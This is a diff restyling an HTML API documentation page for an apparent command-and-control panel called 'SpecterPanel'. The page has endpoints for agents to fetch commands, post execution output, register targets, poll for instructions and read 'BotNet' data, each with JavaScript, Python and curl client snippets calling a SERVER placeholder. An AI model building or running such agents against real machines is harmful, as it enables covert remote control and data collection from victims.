-            <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg>
-            Copy
-          </button>
-        </div>
-        <pre id="api_ApiCommand-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
-  .then(response => {
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    return response.json();
-  })
-  .then(data => console.log('Received commands:', data))
-  .catch(error => console.error('Error fetching commands:', error));</pre>
-        <pre id="api_ApiCommand-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests)
-import requests
+          <div data-code="js" id="api_ApiCommand-js" class="code-block-api">
+            <pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
+  .then(response => response.json())
+  .then(data => console.log(data));</code></pre>
+          </div>
+          <div data-code="py" class="code-block-api hidden">
+            <pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>import requests
 params = {'token': 'ABC123', 'ip': '10.0.0.2', 'os': 'linux'}
-try:
-    response = requests.get('http://SERVER/api/ApiCommand/demo_target', params=params)
-    response.raise_for_status()
-    print("Commands:", response.json())
-except requests.exceptions.RequestException as e:
-    print("Error fetching commands:", e)</pre>
-        <pre id="api_ApiCommand-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -X GET "http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux" -H "Accept: application/json"</pre>
+response = requests.get('http://SERVER/api/ApiCommand/demo_target', params=params)
+print(response.json())</code></pre>
+          </div>
+          <div data-code="curl" class="code-block-api hidden">
+            <pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -X GET "http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux"</code></pre>
+          </div>
+        </div>
       </section>
 
-      <!-- 2. /api/Apicommand/save_output -->
-      <section id="api_save_output" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">POST</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api/Apicommand/save_output</h2>
+      <!-- 2. POST /api/Apicommand/save_output -->
+      <section id="api_save_output" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">POST</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api/Apicommand/save_output</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Submit command execution results back to the server. Agents should call this after executing received commands.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> The output should be an array of arrays, each containing a command ID and its corresponding output.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Request Body (JSON)</h3>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Submit command execution results back to the server.</p>
+        <h4 class="font-semibold text-slate-800 dark:text-slate-100 mt-4 mb-2">Request Body (JSON)</h4>
         <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
+          <table class="min-w-full text-sm">
+            <thead class="bg-slate-50 dark:bg-slate-800/50"><tr><th class="p-2">Name</th><th>Type</th><th>Required</th><th>Description</th></tr></thead>
             <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">token</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">API token matching the registered target</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Target identifier that executed the commands</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">output</td><td class="p-4">array</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Array of [command_id, output_text] pairs</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ip</td><td class="p-4">string</td><td class="p-4"></td><td class="p-4">Agent's current IP address (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">os</td><td class="p-4">string</td><td class="p-4"></td><td class="p-4">Agent's operating system (optional)</td></tr>
+              <tr class="border-t"><td class="p-2">token</td><td>string</td><td>✓</td><td>API token</td></tr>
+              <tr class="border-t"><td class="p-2">target_name</td><td>string</td><td>✓</td><td>Target identifier</td></tr>
+              <tr class="border-t"><td class="p-2">output</td><td>array</td><td>✓</td><td>Array of [command_id, output_text] pairs</td></tr>
             </tbody>
           </table>
         </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "message": "Outputs were saved successfully" }</pre></div>
-          <div><p class="text-sm p-2 bg-[#e06c75]/20 text-[#e06c75] border border-[#e06c75]/30 rounded inline-block break-words"><span class="bg-[#e06c75]/30 px-2 py-0.5 rounded mr-2">403</span> Invalid token</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "Error": "Invalid token or target" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="api_save_output-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_save_output-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_save_output-curl">cURL</button>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="api_save_output" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="api_save_output" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="api_save_output" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="api_save_output-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="api_save_output-js">Copy</button>
-        </div>
-        <pre id="api_save_output-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-const commandOutputs = [["cmd123", "user123\n"], ["cmd124", "Linux hostname 5.4.0-104-generic\n"]];
-fetch('http://SERVER/api/Apicommand/save_output', {
+          <div data-code="js" id="api_save_output-js" class="code-block-api">
+            <pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('http://SERVER/api/Apicommand/save_output', {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ token: 'ABC123', target_name: 'demo_target', ip: '10.0.0.2', os: 'linux', output: commandOutputs })
-}).then(response => response.json()).then(data => console.log('Server response:', data)).catch(error => console.error('Error:', error));</pre>
-        <pre id="api_save_output-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests)
-import requests
-output_data = {'token': 'ABC123', 'target_name': 'demo_target', 'ip': '10.0.0.2', 'os': 'linux', 'output': [['cmd123', 'user123\n'], ['cmd124', 'Linux hostname 5.4.0-104-generic\n']]}
-try:
-    response = requests.post('http://SERVER/api/Apicommand/save_output', json=output_data)
-    print("Server response:", response.json())
-except Exception as e: print("Error:", e)</pre>
-        <pre id="api_save_output-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -X POST "http://SERVER/api/Apicommand/save_output" -H "Content-Type: application/json" -d '{"token":"ABC123","target_name":"demo_target","ip":"10.0.0.2","os":"linux","output":[["cmd123","user123\\n"],["cmd124","Linux hostname 5.4.0-104-generic\\n"]]}'</pre>
+  body: JSON.stringify({
+    token: 'ABC123',
+    target_name: 'demo_target',
+    output: [["cmd123", "user123\\n"]]
+  })
+}).then(r => r.json()).then(console.log);</code></pre>
+          </div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>import requests
+data = {'token':'ABC123','target_name':'demo_target','output':[['cmd123','user123\\n']]}
+requests.post('http://SERVER/api/Apicommand/save_output', json=data)</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -X POST "http://SERVER/api/Apicommand/save_output" -H "Content-Type: application/json" -d '{"token":"ABC123","target_name":"demo_target","output":[["cmd123","user123\\n"]]}'</code></pre></div>
+        </div>
       </section>
 
-      <!-- 3. /api/BotNet/<target_name> -->
-      <section id="api_BotNet" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api/BotNet/&lt;target_name&gt;</h2>
+      <!-- 3. GET /api/BotNet/<target_name> -->
+      <section id="api_BotNet" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api/BotNet/&lt;target_name&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Retrieve botnet-related data stored for a specific target. This endpoint returns key-value pairs that can be used to store and retrieve arbitrary data associated with a target.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Location</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">token</td><td class="p-4">string</td><td class="p-4">query</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">API token for authentication</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4">path</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Unique identifier for the target machine</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "bot_id": "botnet_node_123", "last_seen": "2023-08-11 12:00:00", "status": "active", "custom_data": "any_value" }</pre></div>
-          <div><p class="text-sm p-2 bg-[#e06c75]/20 text-[#e06c75] border border-[#e06c75]/30 rounded inline-block break-words"><span class="bg-[#e06c75]/30 px-2 py-0.5 rounded mr-2">403</span> Invalid token</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "Error": "Invalid token" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="api_BotNet-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_BotNet-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_BotNet-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Retrieve botnet-related data stored for a specific target.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="api_BotNet" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="api_BotNet" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="api_BotNet" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="api_BotNet-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="api_BotNet-js">Copy</button>
+          <div data-code="js" id="api_BotNet-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('http://SERVER/api/BotNet/demo_target?token=ABC123').then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>requests.get('http://SERVER/api/BotNet/demo_target', params={'token':'ABC123'}).json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -X GET "http://SERVER/api/BotNet/demo_target?token=ABC123"</code></pre></div>
         </div>
-        <pre id="api_BotNet-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('http://SERVER/api/BotNet/demo_target?token=ABC123')
-  .then(response => response.json())
-  .then(data => console.log('BotNet data:', data))
-  .catch(error => console.error('Error:', error));</pre>
-        <pre id="api_BotNet-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests)
-import requests
-try:
-    response = requests.get('http://SERVER/api/BotNet/demo_target', params={'token':'ABC123'})
-    print("BotNet data:", response.json())
-except Exception as e: print("Error:", e)</pre>
-        <pre id="api_BotNet-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -X GET "http://SERVER/api/BotNet/demo_target?token=ABC123"</pre>
       </section>
 
-      <!-- 4. /api/registor_target -->
-      <section id="api_registor_target" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">POST</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api/registor_target</h2>
+      <!-- 4. POST /api/registor_target -->
+      <section id="api_registor_target" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">POST</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api/registor_target</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Register a new target with the SpecterPanel system. This endpoint creates a new target entry and returns the assigned target name (which may include a timestamp suffix for uniqueness).</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires a valid ApiToken with registration permissions.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Request Body (JSON)</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">token</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">ApiToken with registration permissions</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Desired base name for the target</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ip</td><td class="p-4">string</td><td class="p-4"></td><td class="p-4">Agent's current IP address (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">os</td><td class="p-4">string</td><td class="p-4"></td><td class="p-4">Agent's operating system (optional)</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "target_name": "demo_target_20230811120000" }</pre></div>
-          <div><p class="text-sm p-2 bg-[#e06c75]/20 text-[#e06c75] border border-[#e06c75]/30 rounded inline-block break-words"><span class="bg-[#e06c75]/30 px-2 py-0.5 rounded mr-2">403</span> Invalid token</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "Error": "Invalid api_token" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="api_registor_target-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_registor_target-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_registor_target-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Register a new target with the system.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="api_registor_target" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="api_registor_target" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="api_registor_target" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="api_registor_target-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="api_registor_target-js">Copy</button>
+          <div data-code="js" id="api_registor_target-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('http://SERVER/api/registor_target', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  body: JSON.stringify({token:'ABC123', target_name:'demo_target'})
+}).then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>requests.post('http://SERVER/api/registor_target', json={'token':'ABC123','target_name':'demo_target'}).json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -X POST "http://SERVER/api/registor_target" -H "Content-Type: application/json" -d '{"token":"ABC123","target_name":"demo_target"}'</code></pre></div>
         </div>
-        <pre id="api_registor_target-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('http://SERVER/api/registor_target', {
-  method: 'POST', headers: {'Content-Type':'application/json'},
-  body: JSON.stringify({token:'ABC123', target_name:'demo_target', ip:'10.0.0.2', os:'linux'})
-}).then(r=>r.json()).then(d=>console.log('Registered:',d.target_name)).catch(e=>console.error(e));</pre>
-        <pre id="api_registor_target-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests)
-import requests
-data = {'token':'ABC123','target_name':'demo_target','ip':'10.0.0.2','os':'linux'}
-try:
-    r = requests.post('http://SERVER/api/registor_target', json=data)
-    print("Registered:", r.json()['target_name'])
-except Exception as e: print(e)</pre>
-        <pre id="api_registor_target-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -X POST "http://SERVER/api/registor_target" -H "Content-Type: application/json" -d '{"token":"ABC123","target_name":"demo_target","ip":"10.0.0.2","os":"linux"}'</pre>
       </section>
 
-      <!-- 5. /api/get_instraction/<target_name> -->
-      <section id="api_get_instraction" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api/get_instraction/&lt;target_name&gt;</h2>
+      <!-- 5. GET /api/get_instraction/<target_name> -->
+      <section id="api_get_instraction" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api/get_instraction/&lt;target_name&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Retrieve the current instruction and delay interval for a target. Agents should call this endpoint to check for new instructions and determine how long to wait before checking again.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Location</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">token</td><td class="p-4">string</td><td class="p-4">query</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">API token</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ip</td><td class="p-4">string</td><td class="p-4">query</td><td class="p-4"></td><td class="p-4">Agent's IP address (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">os</td><td class="p-4">string</td><td class="p-4">query</td><td class="p-4"></td><td class="p-4">Agent's OS (optional)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4">path</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Target identifier</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
